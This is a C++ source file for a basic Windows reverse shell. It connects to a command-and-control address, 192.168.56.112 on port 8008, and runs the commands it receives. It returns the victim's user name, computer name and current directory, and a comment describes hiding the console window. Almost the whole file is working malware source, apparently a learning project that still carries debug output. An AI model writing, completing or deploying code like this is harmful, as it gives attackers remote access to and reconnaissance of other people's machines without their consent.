#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

#include <stdio.h>

// DEBUG, TEMP.
#include <iostream>

void whoami(char* returnval)
{
	DWORD bufferlen = 257;
	// Call WINAPI method, assign it's response to returnval pointer.
	GetUserName(returnval, &bufferlen);
}

void hostname(char* returnval)
{
	DWORD bufferlen = 257;
	GetComputerName(returnval,&bufferlen);
}

void pwd(char* returnval)
{
	TCHAR tempvar[MAX_PATH];
	GetCurrentDirectory(MAX_PATH,tempvar); //returns necessary value into tempvar
	strcat(returnval,tempvar); //you need to put that value into returnval
}

void RevShell()
{
	// WSADATA object - contains details of application state regarding to network
	WSADATA wsaver;

	// Version comparison - whether compiled version of sockets is compatible with the older versions
	WSAStartup(MAKEWORD(2,2), &wsaver);


	SOCKET tcpsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in addr;

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr("192.168.56.112");
	addr.sin_port = htons(8008);

	// This if statement triggers if connection to C&C errored out.
	if (connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr))==SOCKET_ERROR) {
		std::cout << "[-] Error during connection..\n";
		closesocket(tcpsock);
		WSACleanup();
		exit(0);
	}
	// Else connection successfull..
	else {
		std::cout << "[+] Connected..\n" << std::endl;
		
		char CommandReceived[1024] = "";
		// Waiting for incoming connection..
		while (true) {
			int Result = recv(tcpsock, CommandReceived, 1024, 0);
			std::cout << "Command Received: " << CommandReceived;
			std::cout << "Length of Command: " << Result << std::endl;
			
			// Command parsed as whoami (strpcmp makes comparsion with predefined string in this case)
			if (strcmp(CommandReceived, "whoami\n") == 0) {
				char buffer[257] = ""; // reserve buffer with length of 257 bytes
				whoami(buffer); // call whoami function
				strcat(buffer, "\n"); 
				send(tcpsock, buffer, strlen(buffer)+1,0); // send response
				// clear buffers
				memset(buffer, 0, sizeof(buffer));
				memset(CommandReceived, 0, sizeof(CommandReceived));
			}
			// Command parsed as pwd (strpcmp makes comparsion with predefined string in this case)
			else if (strcmp(CommandReceived, "pwd\n") == 0) {
				char buffer[257] = "";
				pwd(buffer);
				strcat(buffer, "\n"); 
				send(tcpsock, buffer, strlen(buffer)+1,0); // send response
				// clear buffers
				memset(buffer, 0, sizeof(buffer));
				memset(CommandReceived, 0, sizeof(CommandReceived));
			}
			else if (strcmp(CommandReceived, "hostname\n") == 0) {
				char buffer[257] = "";
				hostname(buffer);
				strcat(buffer, "\n"); 
				send(tcpsock, buffer, strlen(buffer)+1,0); // send response
				// clear buffers
				memset(buffer, 0, sizeof(buffer));
				memset(CommandReceived, 0, sizeof(CommandReceived));
			}
			else if (strcmp(CommandReceived, "exit\n") == 0) {
				std::cout << "Command parsed: exit" << std::endl;
				std::cout << "Closing connection..." << std::endl;
				sleep(1000);
				exit(0);
			}
			else {
				std::cout << "Command not parsed!" << std::endl;
			}
			memset(CommandReceived, 0, sizeof(CommandReceived));
		}		
	}
	closesocket(tcpsock);
	WSACleanup();
	exit(0);
}

int main()
{
	// Window handle to work with Console window;
	HWND stealth;
	AllocConsole();

	// Idea of searching window and saying to show it (SW_HIDE to hide)
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, SW_SHOWNORMAL);

	std::cout << "Work in progres..\n";
	RevShell();
	return 0;
}
